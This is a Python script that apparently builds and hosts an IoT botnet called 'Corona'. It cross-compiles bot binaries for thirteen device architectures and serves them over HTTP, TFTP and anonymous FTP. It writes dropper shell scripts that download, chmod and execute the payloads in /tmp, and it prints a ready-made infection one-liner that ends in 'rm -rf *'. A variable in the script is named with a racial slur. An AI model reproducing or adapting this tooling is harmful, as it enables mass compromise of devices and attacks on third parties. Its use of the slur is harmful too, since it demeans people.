
import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "gewa"
print("\033[2J\033[1;1H")
input2 = raw_input("Get Architectures? [y/n]: ")
if input2.lower() == "y":
    get_arch = True
else:
    get_arch = False
print(" ")
bot = "*.c"
i = 0
ii = 0
num = 0
Nigger = True
ARCHS = ["ARCH_MIPS",            #1
"ARCH_MIPSEL",                   #2
"ARCH_SH4",                      #3
"ARCH_X86_64",                   #4
"ARCH_I5",                       #5
"ARCH_I6",                       #6
"ARCH_PPC",                      #7
"ARCH_M68K",                     #8
"ARCH_SPARC",                    #9
"ARCH_ARMv4",                    #10
"ARCH_ARMv5",                    #11
"ARCH_ARMv6",                    #12
"ARCH_ARMv7"]                    #13
CompArchName = ["Corona.mips",  #mips   1
"Corona.mipsel", #mipsel                2
"Corona.sh4", #sh4                      3
"Corona.x86_64", #x86_64                4
"Corona.arm6",  #Armv6l                 5
"Corona.i686", #i6                      6
"Corona.ppc", #ppc                      7
"Corona.i586", #i5                      8
"Corona.m68k",#m68k                     9
"Corona.sparc", #sparc                 10
"Corona.arm4",  #Armb4l                11
"Corona.arm5",  #Armv5l                12
"Corona.arm7"]  #Armv7l                13
ccs = ["mips",                   #1
"mipsel",                        #2
"sh4",                           #3
"x86_64",                        #4
"armv6l",                        #5
"i686",                          #6
"powerpc",                       #7
"i586",                          #8
"m68k",                          #9
"sparc",                         #10
"armv4l",                        #11
"armv5l",                        #12
"armv7l"]                        #13
downloadarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2']
 
def run(cmd):
    subprocess.call(cmd, shell=True)
if Nigger == True:
    run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
    run("yum install bzip2 -y &> /dev/null")
    if get_arch == True:
        run("rm -rf cross-compiler-*")
        print("Downloading Architectures")
        print("")
        for arch in downloadarch:
            print("Downloading " + ccs[num] + "!")
            print(" ")
            run("wget " + arch + " --no-check-certificate -q")
            run("tar -jxf *tar.bz2")
            print("Extracting " + ccs[num] + "!")
            print(" ")
            run("rm -rf *tar.bz2")
            num += 1
        print("Successfully Downloaded and Extracted Architectures")
        print(" ")
        print("Moving Architectures")
        print(" ")
        run("mkdir /etc/xcompile/")
        run("mv cross-compiler-armv4l /etc/xcompile/armv4l")
        run("mv cross-compiler-armv5l /etc/xcompile/armv5l")
        run("mv cross-compiler-armv6l /etc/xcompile/armv6l")
	run("mv cross-compiler-armv7l /etc/xcompile/armv7l")
        run("mv cross-compiler-x86_64 /etc/xcompile/x86_64")
        run("mv cross-compiler-i586 /etc/xcompile/i586")
        run("mv cross-compiler-m68k /etc/xcompile/m68k")
        run("mv cross-compiler-mips /etc/xcompile/mips")
        run("mv cross-compiler-mipsel /etc/xcompile/mipsel")
        run("mv cross-compiler-powerpc /etc/xcompile/powerpc")
        run("mv cross-compiler-sh4 /etc/xcompile/sh4")
        run("mv cross-compiler-sparc /etc/xcompile/sparc")
        run("mv cross-compiler-i686 /etc/xcompile/i686")
        print("Finished Moving Architectures To /etc/xcompile/")
        print(" ")
	print("Compiling Architectures")
    print(" ") 
    for cc in ccs:
        print("Cross Compiling for "+cc+"!")
        run("/etc/xcompile/" + cc + "/bin/" + cc + "-gcc -static -w -D" + ARCHS[ii] + " -o " + CompArchName[i] + " " + bot + " > /dev/null")
        ii += 1
	i += 1
    ii = 0
    i = 0
    print("Setting up HTTP TFTP and FTP for your payload")
    print(" ")
    run("yum install httpd -y &> /dev/null")
    run("service httpd start ")
    run("yum install xinetd tftp tftp-server -y &> /dev/null")
    run("yum install vsftpd -y &> /dev/null")
    run("service vsftpd start &> /dev/null")
    print("Moving Compiled Architectures")
    print(" ")
    run("mkdir /var/www/html")
    run("mkdir /var/ftp")
    run("mkdir /var/lib/tftpboot")
    run("cp Corona.* /var/www/html")
    run("cp Corona.* /var/ftp")
    run("mv Corona.* /var/lib/tftpboot/")
    run('''echo -e "# default: off
    # description: The tftp server serves files using the trivial file transfer \
    #       protocol.  The tftp protocol is often used to boot diskless \
    #       workstations, download configuration files to network-aware printers, \
    #       and to start the installation process for some operating systems.
    service tftp
    {
            socket_type             = dgram
            protocol                = udp
            wait                    = yes
            user                    = root
            server                  = /usr/sbin/in.tftpd
            server_args             = -s -c /var/lib/tftpboot
            disable                 = no
            per_source              = 11
            cps                     = 100 2
            flags                   = IPv4
    }
    " > /etc/xinetd.d/tftp''')	
    run("service xinetd start &> /dev/null")
    run('''echo -e "listen=YES
    local_enable=NO
    anonymous_enable=YES
    write_enable=NO
    anon_root=/var/ftp
    anon_max_rate=2048000
    xferlog_enable=YES
    listen_address='''+ ip +'''
    listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
    run("service vsftpd restart &> /dev/null")
    run("service xinetd restart &> /dev/null")
    print("Creating .sh Bins")
    print(" ")
    run('echo "#!/bin/bash" > /var/lib/tftpboot/Corona2.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Corona2.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Corona2.sh')
    run('echo "#!/bin/bash" > /var/lib/tftpboot/Corona3.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Corona3.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Corona3.sh')
    run('echo "#!/bin/bash" > /var/www/html/Corona.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Corona3.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Corona3.sh')
    run('echo "#!/bin/bash" > /var/ftp/Corona.sh')
    run('echo "ulimit -n 1024" >> /var/ftp/Corona4.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/ftp/Corona4.sh')
    for i in CompArchName:
        run('echo "cd /tmp ; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + ';cat ' + i + ' >'+exec_bin+';chmod 777 *;/tmp/'+exec_bin+'" >> /var/www/html/Corona.sh')
	run('echo "cd /tmp ; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + ';cat ' + i + ' >'+exec_bin+';chmod 777 *;/tmp/'+exec_bin+'" >> /var/ftp/Corona4.sh')
	run('echo "cd /tmp ; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >'+exec_bin+';chmod +x *;/tmp/'+exec_bin+'" >> /var/lib/tftpboot/Corona2.sh')
	run('echo "cd /tmp ; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >'+exec_bin+';chmod +x *;/tmp/'+exec_bin+'" >> /var/lib/tftpboot/Corona3.sh')    
	run("service xinetd restart &> /dev/null")
    run("service httpd restart &> /dev/null")
    run('echo -e "ulimit -n 999999" >> ~/.bashrc')
    print("\x1b[0;32mWGET: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Corona.sh; curl -O http://" + ip + "/Corona.sh; chmod 777 Corona.sh; sh Corona.sh; tftp " + ip + " -c get Corona2.sh; chmod 777 Corona2.sh; sh Corona2.sh; tftp -r Corona3.sh -g " + ip + "; chmod 777 Corona3.sh; sh Corona3.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Corona4.sh Corona4.sh; sh Corona4.sh; rm -rf *\x1b[0m")
    print("")
    raw_input("press any key to exit....")
